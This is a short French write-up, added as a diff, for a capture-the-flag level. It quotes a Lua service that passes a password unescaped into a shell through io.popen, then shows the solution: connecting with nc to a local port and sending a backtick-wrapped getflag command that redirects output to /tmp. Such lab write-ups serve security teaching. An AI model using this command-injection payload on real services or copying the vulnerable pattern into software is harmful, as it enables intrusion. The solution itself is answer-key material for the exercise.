@@ -1,0 +1,18 @@
+cat level11, on note ces lignes en particulier:
+
+	local server = assert(socket.bind("127.0.0.1", 5151))
+
+ceci ouvre un socket sur le port 5151 de l'host 127.0.0.1
+
+	prog = io.popen("echo "..pass.." | sha1sum", "r")
+
+ceci concatene le password puis execute les commandes shell puis sauvegarde le retour dans une variable.
+
+C'est tout ce dont on a besoin, il suffit de se connecter au socket puis de donner un password qui va modifier l'execution dans le shell:
+
+-  nc 127.0.0.1 5151
+*Password:*
+- `getflag` > /tmp/tutu
+
+et paf on a le flag pour lvl12 dans tutu
+
